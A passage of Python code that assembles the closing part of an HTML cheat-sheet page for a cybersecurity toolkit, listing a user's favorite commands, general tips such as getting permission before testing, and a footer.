                </div>
            </div>
        """

        # Add favorite commands if any
        if self.favorites:
            html += """
            <h2>Your Favorite Commands</h2>
            <div class="favorites">
            """
            for favorite in sorted(self.favorites):
                html += f'<div class="command-block"><div class="command">{favorite}</div></div>'
            html += "</div>"

        html += """
            <h2>Quick Tips</h2>
            <div class="category">
                <ul>
                    <li>Always ensure you have permission before testing</li>
                    <li>Use VPN when conducting security assessments</li>
                    <li>Document everything for reporting</li>
                    <li>Keep tools updated for latest features</li>
                </ul>
            </div>

            <footer style="text-align: center; margin-top: 50px; color: #7f8c8d;">
                <p>Generated by Leegion Framework - Enhanced Cybersecurity Toolkit</p>
            </footer>
        </body>
        </html>
        """

        return html
